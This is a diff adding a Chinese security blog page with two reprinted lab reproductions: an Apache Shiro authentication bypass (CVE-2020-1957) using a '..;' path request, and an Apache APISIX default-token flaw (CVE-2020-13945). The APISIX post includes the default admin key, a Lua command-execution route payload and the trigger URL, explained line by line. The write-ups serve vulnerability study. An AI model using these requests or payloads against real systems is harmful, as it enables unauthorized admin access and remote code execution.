+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-shiro-认证绕过漏洞-cve-2020-1957-漏洞复现">Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/119105197">Senimo_</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>CVE-2020-1957，Spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><h3><span id="环境搭建">环境搭建</span></h3><blockquote>
+<p>执行如下命令启动一个搭载Spring 2.2.2与Shiro 1.5.1的应用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/shiro/CVE-2020-1957</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>环境启动后，访问<code>http://x.x.x.x:8080</code>即可查看首页:</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/1.png" alt="image"></p>
+<p>这个应用中对URL权限的配置如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ShiroFilterChainDefinition <span class="title function_">shiroFilterChainDefinition</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">DefaultShiroFilterChainDefinition</span> <span class="variable">chainDefinition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultShiroFilterChainDefinition</span>();</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/login.html&quot;</span>, <span class="string">&quot;authc&quot;</span>); <span class="comment">// need to accept POSTs from the login form</span></span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/logout&quot;</span>, <span class="string">&quot;logout&quot;</span>);</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> chainDefinition;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="漏洞复现">漏洞复现</span></h3><blockquote>
+<p>使用BurpSuite抓取数据包，访问<code>/admin/</code>目录：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/2.png" alt="image"></p>
+<p>回显<code>302</code>并跳转到登录页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/3.png" alt="image"></p>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/4.png" alt="image"></p>
+<p>URL请求过程：</p>
+<ul>
+<li>客户端请求URL: <code>/xxx/..;/admin/</code></li>
+<li>Shrio 内部处理得到校验URL为 <code>/xxxx/..</code>,校验通过</li>
+<li>SpringBoot 处理 <code>/xxx/..;/admin/</code> , 最终请求 <code>/admin/</code>, 成功访问了后台请求。</li>
+</ul>
+</blockquote>
+<h2><span id="漏洞poc">漏洞POC</span></h2><blockquote>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.safedog.cn/news.html?id=4441">https://www.safedog.cn/news.html?id=4441</a><br><a target="_blank" rel="noopener" href="https://blog.spoock.com/2020/05/09/cve-2020-1957/">https://blog.spoock.com/2020/05/09/cve-2020-1957/</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/CVE-2020-13945-Apache-APISIX/">
+                Apache APISIX 默认密钥漏洞（CVE-2020-13945）
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-apisix-默认密钥漏洞cve-2020-13945">Apache APISIX 默认密钥漏洞（CVE-2020-13945）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/horistttt/article/details/124344871">horisMMM</a> 并作补充</p>
+</blockquote>
+<h2><span id="apisix简介">APISIX简介</span></h2><blockquote>
+<p>官方一句话介绍：Apache APISIX是一个高性能API网关。</p>
+<p>API网关又是什么？</p>
+<p>百度：API网关，软件术语，两个相互独立的局域网之间通过路由器进行通信，中间的路由被称之为网关。</p>
+<p>任何一个应用系统如果需要被其他系统调用，就需要暴露 API，这些 API 代表着一个一个的功能点。</p>
+<p>如果两个系统中间通信，在系统之间加上一个中介者协助 API 的调用，这个中介者就是 API 网关。</p>
+<p>那意思就是Apisix是两个系统的一个中介，可以使用这个中间管理系统API。</p>
+</blockquote>
+<h2><span id="存在漏洞">存在漏洞</span></h2><blockquote>
+<p>在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token edd1c9f034335f136f87ad84b625c8f1，攻击者利用这个Token可以访问到管理员接口，进而通过script参数来插入任意LUA脚本并执行。</p>
+<p>意思就是有一个默认的Token，可以直接得到管理员权限，并插入攻击脚本。</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p>docker-compose up -d 搭建环境</p>
+<p>docker ps 查看端口为9080</p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/1.png" alt="image"></p>
+<p>访问 127.0.0.1&#x2F;asixpix&#x2F;admin&#x2F;routes,显示token不正确</p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/2.png" alt="image"></p>
+<p>抓这个包，把方法改为POST，加上X-API-KEY: edd1c9f034335f136f87ad84b625c8f1，加上payload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;/attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M = &#123;&#125; \n function _M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;*a&#x27;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/3.png" alt="image"></p>
+<p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9080/attack?cmd=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="payload分析">payload分析</span></h2><blockquote>
+<p>查看官方文档，观察创建路由的方法</p>
+<p><a target="_blank" rel="noopener" href="https://apisix.apache.org/zh/docs/apisix/getting-started/">https://apisix.apache.org/zh/docs/apisix/getting-started/</a></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/5.png" alt="image"></p>
+<p>与payload对比，发现payload格式与官方创建路由一致，只是利用script插入了一段lua恶意脚本。</p>
+<p>在 Apache APISIX 中，我们在 Route 实体中新增了 script 执行逻辑，可用于接收 Dashboard 生成的 Lua 函数并执行，它支持调用已有插件以复用代码。另外，它也作用于 HTTP 请求的生命周期中的各个阶段，如 access、header_filer、body_filter 等，系统会在相应阶段自动执行 script 函数对应阶段代码<br><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/6.png" alt="image"></p>
+<p>接下来对lua脚本进行分析,\n是换行</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;&#125; \n <span class="function"><span class="keyword">function</span> <span class="title">_M.access</span><span class="params">(conf, ctx)</span></span>//在access阶段进行处理，检查如果达到的不健康次数超过了配置的最大次数，则就被<span class="keyword">break</span>掉。这里没找到看得懂的资料。</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">os</span> = <span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>)//加载<span class="built_in">os</span>模块，用于进行文件操作</span><br><span class="line"><span class="keyword">local</span> args = <span class="built_in">assert</span>(ngx.req.get_uri_args()) //<span class="built_in">assert</span>()是断言，类似于try(),这里是获取uri中给的参数。</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">popen</span>(args.cmd, <span class="string">&#x27;r&#x27;</span>))//<span class="built_in">io</span>.<span class="built_in">popen</span>()用于执行系统命令,<span class="string">&#x27;r&#x27;</span>是模式</span><br><span class="line"><span class="keyword">local</span> s = <span class="built_in">assert</span>(f:<span class="built_in">read</span>(<span class="string">&#x27;*a&#x27;</span>))//读取全部内容</span><br><span class="line">ngx.say(s)//输出，还有一种方法是ngx.<span class="built_in">print</span>(),但两者有区别</span><br><span class="line">f:<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"><span class="keyword">return</span> _M</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>function _M.access(conf, ctx)</strong></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/7.png" alt="image"></p>
+<p><strong>assert()</strong></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/8.png" alt="image"></p>
+<p><strong>read(‘a’)</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013625451/article/details/78879739">https://blog.csdn.net/u013625451/article/details/78879739</a></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/9.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+</section>
+
+
+  <nav id="page-nav" class="clearfix">
+    
+    <a class="prev" rel="prev" href="/archives/2023/12/">
+      <span class="icon icon-chevron-left"></span>
+      <span class="text">Previous</span>
+    </a>
+    
+    
+  </nav>
+
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/artchen" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
